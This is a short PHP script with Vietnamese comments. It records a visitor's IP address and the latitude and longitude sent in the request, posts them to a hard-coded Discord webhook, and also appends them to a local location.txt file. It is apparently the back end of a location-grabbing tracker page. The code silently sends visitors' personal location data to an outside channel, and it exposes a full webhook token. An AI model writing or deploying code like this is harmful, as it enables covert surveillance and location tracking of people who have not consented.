<?php
// 1. Lấy địa chỉ IP
function getVisitorIp() {
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    }
    return $_SERVER['REMOTE_ADDR'];
}

$ip = getVisitorIp();
$lat = $_GET["lat"];
$long = $_GET["long"];

// 2. Cấu hình Webhook Discord
$webhook_url = "https://discord.com/api/webhooks/1527956134856495104/4nt29jEEtSdg99Ks_nga5go68k-MyiYoI-e8RY3ymAEw_dgQf98bVuoE6l7_odXxtUXS";

// 3. Tạo nội dung tin nhắn
$message = [
    "content" => "📍 **Thông tin truy cập mới:**\n**IP:** $ip\n**Vĩ độ:** $lat\n**Kinh độ:** $long"
];

// 4. Gửi dữ liệu bằng cURL
$ch = curl_init($webhook_url);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-type: application/json']);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($message));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

// (Tùy chọn) Vẫn lưu vào file nếu bạn muốn
$myfile = fopen("location.txt", "a");
fwrite($myfile, "IP: $ip | Lat: $lat | Long: $long\n");
fclose($myfile);
?>
